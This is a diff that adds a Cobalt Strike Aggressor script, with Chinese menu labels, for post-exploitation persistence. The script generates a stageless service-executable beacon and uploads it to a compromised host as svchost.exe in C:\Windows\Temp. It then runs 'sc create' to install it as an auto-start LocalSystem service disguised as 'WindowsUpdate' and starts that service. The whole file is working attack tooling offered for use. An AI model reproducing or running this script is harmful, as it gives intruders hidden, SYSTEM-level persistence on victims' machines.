@@ -1,0 +1,44 @@
+sub ready {
+	$handle = openf(">$exename");
+	writeb($handle, $1);
+	closef($handle);
+}
+
+sub servicerun{
+	if (size($bid) > 1){
+		show_message("不支持多beacon操控");
+	}else{
+		$arch = barch($bid[0]);
+		$exename = script_resource($3['exename']);
+		btask($bid, "Create Service exe,output: $exename");
+		artifact_stageless("$3['listener']", "svcexe", "$arch", "", &ready);
+		btask($bid, "upload file: $exename");
+		bupload($bid, $exename);
+		bmv($bid, $3['exename'], $3['uploadoutpath'].$3['exename']);
+		$command = "sc create WindowsUpdate binPath= ".$3['uploadoutpath'].$3['exename']." start= auto obj= LocalSystem DisplayName= windowsupdate";
+		btask($bid, "run $command");
+		bshell($bid, $command);
+		btask($bid, "Query WindowsUpdate Service");
+		bshell($bid, "sc qc WindowsUpdate");
+		btask($bid, "Run WindowsUpdate Service");
+		bshell($bid, "sc start WindowsUpdate");
+	}
+}
+
+
+popup beacon_bottom{
+	menu "&权限维持"{
+			item "&cs服务马"{
+			$bid = $1;
+			$dialog = dialog("ServiceRunBeacon", %(uploadoutpath => "C:\\Windows\\Temp\\", exename => "svchost.exe", servicename => "WindowsUpdate", bid => $bid), &servicerun);
+			dialog_description($dialog, "生成服务马上传执行，进行权限维持\n不支持多beacon操控");
+				
+			drow_text($dialog, "uploadoutpath", "uploadoutpath:");
+			drow_text($dialog, "servicename",  "servicename:");
+			drow_text($dialog, "exename", "outputexename:");
+			drow_listener($dialog, "listener", "Listener: ");
+			dbutton_action($dialog, "run");
+			dialog_show($dialog);
+		}
+	}
+}
